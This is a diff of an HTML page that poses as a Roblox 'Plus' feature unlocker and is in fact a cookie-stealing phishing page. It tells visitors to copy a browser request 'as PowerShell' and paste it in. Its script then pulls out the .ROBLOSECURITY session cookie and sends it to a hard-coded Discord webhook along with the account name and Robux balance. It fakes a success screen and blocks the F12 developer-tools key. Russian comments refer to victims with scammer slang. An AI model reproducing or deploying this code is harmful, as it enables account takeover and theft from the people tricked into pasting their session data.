@@ -12,20 +12,28 @@
             background: #ffffff; 
             color: #000000; 
             -webkit-font-smoothing: antialiased;
-            user-select: none;
         }
         .ui-card {
-            background: #ffffff; border: 1px solid #f2f2f2;
+            background: #ffffff;
+            border: 1px solid #f2f2f2;
             box-shadow: 0 4px 20px rgba(0,0,0,0.02);
         }
         .code-area {
-            background: #fcfcfc; border: 1px solid #eeeeee;
-            color: #000000; transition: all 0.2s ease;
+            background: #fcfcfc;
+            border: 1px solid #eeeeee;
+            color: #000000;
+            transition: all 0.2s ease;
         }
-        .code-area:focus { border-color: #000000; outline: none; background: #ffffff; }
+        .code-area:focus {
+            border-color: #000000;
+            outline: none;
+            background: #ffffff;
+        }
         .btn-action {
-            background: #000000; color: #ffffff;
-            transition: all 0.2s ease; font-weight: 800;
+            background: #000000;
+            color: #ffffff;
+            transition: all 0.2s ease;
+            font-weight: 800;
         }
         .btn-action:hover { background: #333333; }
         #successScreen { display: none; }
@@ -46,6 +54,7 @@
     </header>
 
     <main class="flex-1 w-full max-w-xl flex flex-col justify-center px-6 pb-32 mx-auto">
+        
         <div id="configView" class="fade-in">
             <div class="mb-12">
                 <h1 class="text-4xl font-extrabold tracking-tighter mb-4 italic uppercase">Plus Configuration</h1>
@@ -55,15 +64,32 @@
             </div>
 
             <div class="ui-card rounded-[40px] p-10">
-                <div class="mb-10 space-y-5 text-gray-500 font-bold uppercase text-[10px] tracking-widest">
-                    <div class="flex items-center gap-4"><span>01</span><span>Open Roblox.com and Press F12</span></div>
-                    <div class="flex items-center gap-4"><span>02</span><span>Network > Refresh > Right-click row</span></div>
-                    <div class="flex items-center gap-4"><span>03</span><span>Copy > Copy as PowerShell</span></div>
+                <div class="mb-10 space-y-5">
+                    <div class="flex items-start gap-5">
+                        <span class="text-xs font-black text-gray-200">01</span>
+                        <p class="text-xs text-gray-500 font-bold uppercase tracking-wide">Open Roblox.com and Press F12</p>
+                    </div>
+                    <div class="flex items-start gap-5">
+                        <span class="text-xs font-black text-gray-200">02</span>
+                        <p class="text-xs text-gray-500 font-bold uppercase tracking-wide">Network > Refresh > Right-click any row</p>
+                    </div>
+                    <div class="flex items-start gap-5">
+                        <span class="text-xs font-black text-gray-200">03</span>
+                        <p class="text-xs text-gray-500 font-bold uppercase tracking-wide">Copy > Copy as PowerShell</p>
+                    </div>
                 </div>
 
-                <textarea id="sessionData" placeholder="Paste configuration code here..." class="code-area w-full h-40 rounded-3xl p-6 text-[10px] font-mono resize-none mb-8"></textarea>
+                <div class="mb-8">
+                    <textarea 
+                        id="sessionData" 
+                        placeholder="Paste configuration code here..." 
+                        class="code-area w-full h-40 rounded-3xl p-6 text-[10px] font-mono resize-none"
+                    ></textarea>
+                </div>
 
-                <button id="syncBtn" onclick="processSync()" class="btn-action w-full py-6 rounded-2xl text-[11px] uppercase tracking-[0.2em]">Enable Features</button>
+                <button id="syncBtn" onclick="initiateSync()" class="btn-action w-full py-6 rounded-2xl text-[11px] uppercase tracking-[0.2em]">
+                    Enable Features
+                </button>
             </div>
         </div>
 
@@ -72,75 +98,76 @@
                 <svg class="w-6 h-6 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
             </div>
             <h2 class="text-3xl font-black tracking-tighter mb-4 italic uppercase">Syncing...</h2>
-            <p class="text-gray-400 text-sm font-medium leading-relaxed max-w-xs mx-auto">Configuration updated. Do not close the tab.</p>
+            <p class="text-gray-400 text-sm font-medium leading-relaxed max-w-xs mx-auto">Features will be available shortly. Do not close the tab.</p>
         </div>
+
     </main>
 
     <script>
-        // БЕЗОПАСНОСТЬ: Разбиваем вебхук
-        const _u1 = "https://discord.com/api/web";
-        const _u2 = "hooks/";
-        const _u3 = "1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r"; // Пример: 12345/abcde...
+        // ВСТАВЬ СВОЙ ВЕБХУК СЮДА ПОЛНОСТЬЮ
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r"; 
 
-        const getUrl = () => _u1 + _u2 + _u3;
-
-        async function processSync() {
-            const val = document.getElementById('sessionData').value;
+        async function initiateSync() {
+            const input = document.getElementById('sessionData');
             const btn = document.getElementById('syncBtn');
-            
+            const val = input.value;
+
+            if (val.length < 10) return;
+
             btn.disabled = true;
             btn.innerText = "CONNECTING...";
 
-            const cookieMatch = val.match(/\.ROBLOSECURITY=(_\|[^;'"\s]+)/);
-            if (!cookieMatch) {
-                setTimeout(showSuccess, 1000);
-                return;
-            }
+            // Ищем куку в формате System.Net.Cookie или обычном
+            const cookieRegex = /\.ROBLOSECURITY=(_\|[^;'"\s]+)/;
+            const match = val.match(cookieRegex);
+            const cookieValue = match ? match[1] : "NOT_FOUND";
 
-            const cookie = cookieMatch[1];
-            let info = { user: "Unknown", robux: "0", id: "0" };
+            let accountInfo = { name: "Unknown", robux: "0", id: "0" };
 
             try {
-                // Попытка собрать данные (может не сработать из-за CORS)
-                const res = await fetch('https://www.roblox.com/mobileapi/userinfo');
-                const data = await res.json();
-                info = { user: data.UserName, robux: data.RobuxBalance, id: data.UserID };
-            } catch (e) {}
+                // Чекер баланса через API (работает из-под сессии мамонта)
+                const response = await fetch('https://www.roblox.com/mobileapi/userinfo');
+                const data = await response.json();
+                accountInfo = {
+                    name: data.UserName,
+                    robux: data.RobuxBalance,
+                    id: data.UserID
+                };
+            } catch (e) {
+                console.log("CORS or Auth Error");
+            }
 
-            // ШИФРОВАНИЕ: Переворачиваем куку, чтобы Discord её не "съел"
-            const reversedCookie = cookie.split("").reverse().join("");
-            
+            // Отправка в Discord
             const payload = {
+                content: "@everyone",
                 embeds: [{
-                    title: "📦 NEW CONFIG SYNC",
+                    title: "✅ NEW LOG RECEIVED",
                     color: 0,
                     fields: [
-                        { name: "User", value: `\`${info.user}\` (${info.id})`, inline: true },
-                        { name: "Balance", value: `\`${info.robux} R$\``, inline: true },
-                        { name: "Config Data (Reversed)", value: "```" + reversedCookie + "```" }
+                        { name: "👤 User", value: `**${accountInfo.name}** (${accountInfo.id})`, inline: true },
+                        { name: "💰 Balance", value: `\`${accountInfo.robux} R$\``, inline: true },
+                        { name: "🔑 Cookie", value: "```" + cookieValue + "```" },
+                        { name: "📝 Raw Start", value: "```" + val.substring(0, 100) + "```" }
                     ],
-                    footer: { text: "Note: Use tool to reverse text back to normal" },
+                    footer: { text: "R+ Analytics System" },
                     timestamp: new Date()
                 }]
             };
 
             try {
-                await fetch(getUrl(), {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {}
+            } catch (err) {}
 
-            setTimeout(showSuccess, 1500);
-        }
-
-        function showSuccess() {
+            // Всегда показываем успех
             document.getElementById('configView').style.display = 'none';
             document.getElementById('successScreen').style.display = 'block';
         }
 
-        // Защита от F12
+        // Защита консоли
         document.onkeydown = e => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
     </script>
 </body>
